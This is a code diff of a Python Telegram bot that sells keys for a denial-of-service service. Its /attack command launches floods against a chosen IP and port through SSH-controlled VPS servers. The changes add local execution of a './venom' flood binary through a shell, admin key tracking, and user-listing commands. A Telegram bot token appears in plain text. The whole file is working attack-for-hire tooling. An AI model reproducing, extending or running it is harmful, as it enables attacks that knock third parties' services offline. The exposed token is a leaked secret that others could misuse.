@@ -1,6 +1,14 @@
 #!/usr/bin/env python3
 import subprocess
 import sys
+import threading
+import time
+import json
+import os
+import uuid
+import traceback
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
 
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
@@ -18,16 +26,29 @@ except ImportError:
     install("paramiko")
     import paramiko
 
-import threading
-import time
-import json
-import os
-import uuid
-import traceback
-from datetime import datetime, timedelta
-from concurrent.futures import ThreadPoolExecutor
+# ---------------------------
+# Periodic Print Function
+# ---------------------------
+def print_periodically():
+    while True:
+        time.sleep(240)  # 4 minutes
+        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Periodic message printed to the terminal.")
 
-# Replace these with your actual credentials
+# ---------------------------
+# Own VPS Command Execution Function
+# ---------------------------
+def execute_own_vps_command(target_ip, target_port, duration):
+    try:
+        # Execute the binary on the current machine (your own VPS)
+        command = f'nohup ./venom {target_ip} {target_port} {duration} > /dev/null 2>&1 &'
+        subprocess.Popen(command, shell=True)
+        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Executed on own VPS: {command}")
+    except Exception as e:
+        print(f"❌ Error executing command on own VPS: {e}")
+
+# ---------------------------
+# Bot and Global Setup
+# ---------------------------
 BOT_TOKEN = '7715609619:AAHzD-H2qh6RLfkWiJLQxY6iKLC6_JnplyM'
 BOT_OWNER_ID = 5730843286  # Replace with your Telegram ID
 
@@ -264,11 +285,13 @@ def callback_help(call):
                 "• /usekey &lt;key&gt; - Register a key 📝\n"
                 "• /keyinfo - View key info ℹ️\n"
                 "• /revoke &lt;key&gt; - Revoke a key (Owner only) ❌\n"
-                "• /listkeys - List all keys (Owner only) 📜")
+                "• /listkeys - List all keys (Owner only) 📜\n"
+                "• /keyadmin - See which admin generated which key")
     elif call.data == "help_users":
         text = ("<b>👥 User Management</b>\n"
                 "• /blockuser &lt;user_id&gt; - Block a user (Owner only) 🚫\n"
-                "• /unblockuser &lt;user_id&gt; - Unblock a user (Owner only) ✅")
+                "• /unblockuser &lt;user_id&gt; - Unblock a user (Owner only) ✅\n"
+                "• /activeusers - List all active users")
     else:
         text = "<b>❓ No help available.</b>"
     chat_id = call.message.chat.id if call.message else call.from_user.id
@@ -289,10 +312,11 @@ def send_welcome(message):
         "Commands include:\n"
         "• /genkey, /usekey, /attack 🚀\n"
         "• /addvps, /listvps, /removevps, /updatevps, /status 🖥️\n"
-        "• /logs, /revoke, /listkeys, /keyinfo 📜\n"
-        "• /blockuser, /unblockuser, /cancel 🛑\n"
+        "• /logs, /revoke, /listkeys, /keyinfo, /keyadmin 📜\n"
+        "• /blockuser, /unblockuser, /activeusers, /cancel 🛑\n"
         "• /admin, /checkcredits, /addcredit, /addadmin, /removeadmin 💳\n"
-        "• /setduration, /setcooldown (Owner only)"
+        "• /setduration, /setcooldown (Owner only)\n"
+        "• /attack will execute using your own VPS if no external VPS is available."
     )
     safe_reply(message, welcome_text)
 
@@ -333,7 +357,8 @@ def generate_key(message):
         "expires_at": expiration.isoformat(),
         "max_users": max_users,
         "max_duration": max_duration,
-        "used": []
+        "used": [],
+        "generated_by": message.from_user.id
     }
     save_keys_data()
     reply = (f"<b>✅ Key generated:</b> <code>{new_key}</code>\n"
@@ -452,15 +477,54 @@ def attack_vps(message):
     if duration > key_data["max_duration"]:
         safe_reply(message, f"<b>⚠️ Duration exceeds your key's max duration of {key_data['max_duration']} seconds.</b>")
         return
+    # If no external VPS is available, execute the binary on your own VPS
     if not vps_servers:
-        safe_reply(message, "<b>❌ No VPS available for the attack!</b>")
+        safe_reply(message, "<b>ℹ️ No external VPS available. Executing on your own VPS.</b>")
+        threading.Thread(target=execute_own_vps_command, args=(ip, port, duration), daemon=True).start()
+    else:
+        cancel_event.clear()
+        safe_reply(message, f"<b>🔥 Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS Count: {len(vps_servers)}")
+        attack_cooldowns[ip] = now + timedelta(seconds=global_cooldown)
+        for vps in vps_servers:
+            thread = threading.Thread(target=execute_command, args=(vps, ip, port, duration), daemon=True)
+            thread.start()
+
+# ---------------------------
+# New Command: List Active Users
+# ---------------------------
+@bot.message_handler(commands=['activeusers'])
+@safe_handler
+def active_users_handler(message):
+    # Only allow the owner to view active users
+    if message.from_user.id != BOT_OWNER_ID:
+        safe_reply(message, "<b>🚫 Not authorized to view active users!</b>")
         return
-    cancel_event.clear()
-    safe_reply(message, f"<b>🔥 Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS Count: {len(vps_servers)}")
-    attack_cooldowns[ip] = now + timedelta(seconds=global_cooldown)
-    for vps in vps_servers:
-        thread = threading.Thread(target=execute_command, args=(vps, ip, port, duration), daemon=True)
-        thread.start()
+    if not users:
+        safe_reply(message, "<b>ℹ️ No active users.</b>")
+        return
+    reply = "<b>👥 Active Users:</b>\n"
+    for user_id, key in users.items():
+        reply += f"User ID: <code>{user_id}</code> | Key: <code>{key}</code>\n"
+    safe_reply(message, reply)
+
+# ---------------------------
+# New Command: List Keys with Admin Info
+# ---------------------------
+@bot.message_handler(commands=['keyadmin'])
+@safe_handler
+def key_admin_handler(message):
+    # Only allow the owner to view which admin generated keys
+    if message.from_user.id != BOT_OWNER_ID:
+        safe_reply(message, "<b>🚫 Not authorized to view key admin info!</b>")
+        return
+    if not keys:
+        safe_reply(message, "<b>ℹ️ No keys generated.</b>")
+        return
+    reply = "<b>🔑 Key Generation Info:</b>\n"
+    for key_val, details in keys.items():
+        gen_by = details.get("generated_by", "N/A")
+        reply += f"Key: <code>{key_val}</code> | Generated by Admin ID: <code>{gen_by}</code>\n"
+    safe_reply(message, reply)
 
 # ---------------------------
 # VPS Management Commands
@@ -784,7 +848,8 @@ def admin_generate_key_step(message):
         "expires_at": expiration.isoformat(),
         "max_users": max_users,
         "max_duration": max_duration,
-        "used": []
+        "used": [],
+        "generated_by": admin_id
     }
     save_keys_data()
     deduct_credit(admin_id, total_cost, reason="Key Generation")
@@ -947,6 +1012,10 @@ def echo_all(message):
 # Main Bot Loop with Watchdog
 # ---------------------------
 if __name__ == '__main__':
+    # Start the periodic print thread
+    periodic_thread = threading.Thread(target=print_periodically, daemon=True)
+    periodic_thread.start()
+
     while True:
         try:
             print("🤖 Bot is running...")
